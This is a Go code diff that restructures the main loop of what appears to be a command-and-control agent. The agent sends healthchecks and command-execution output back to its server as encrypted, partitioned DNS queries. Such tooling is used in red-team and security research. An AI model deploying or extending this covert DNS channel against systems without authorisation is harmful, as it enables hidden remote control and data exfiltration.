@@ -273,41 +273,39 @@ func RunAgent(serverIo AgentIO) {
 	}
 
 	go func() {
-		for text := range Config.io.GetInputFeed() {
-			SendMessageToServer(text)
-		}
-	}()
-
-	for {
-		select {
-		case <-exiting:
-			// When exiting, return immediately
-			return
-		case <-AgentStatus.MessageTicker.C:
-			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
-				if err := sendHealthCheck(); err != nil {
-					Config.io.Logger(WARN, "%s", err)
-				}
-			}
-			if AgentStatus.NextMessageType == c2.MessageExecuteCommandResponse {
-				msg := c2.MessagePacket{
-					TimeStamp:   uint32(time.Now().Unix()),
-					MessageType: AgentStatus.NextMessageType,
-				}
-				payload := []byte(AgentStatus.NextPayload)
-				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
-				if err != nil {
-					Config.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
-				}
-				for _, Q := range Questions {
-					err = SendQuestionToServer(Q)
-					if err != nil {
-						Config.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
+		for {
+			select {
+			case <-exiting:
+				// When exiting, return immediately
+				return
+			case <-AgentStatus.MessageTicker.C:
+				if AgentStatus.NextMessageType == c2.MessageHealthcheck {
+					if err := sendHealthCheck(); err != nil {
+						Config.io.Logger(WARN, "%s", err)
 					}
 				}
+				if AgentStatus.NextMessageType == c2.MessageExecuteCommandResponse {
+					msg := c2.MessagePacket{
+						TimeStamp:   uint32(time.Now().Unix()),
+						MessageType: AgentStatus.NextMessageType,
+					}
+					payload := []byte(AgentStatus.NextPayload)
+					Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
+					if err != nil {
+						Config.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
+					}
+					for _, Q := range Questions {
+						err = SendQuestionToServer(Q)
+						if err != nil {
+							Config.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
+						}
+					}
+				}
+				// function to handle response coming from the server and update the status accordingly
+				// handleServerResponse(response)
+			case text := <-Config.io.GetInputFeed():
+				SendMessageToServer(text)
 			}
-			// function to handle response coming from the server and update the status accordingly
-			// handleServerResponse(response)
 		}
-	}
+	}()
 }
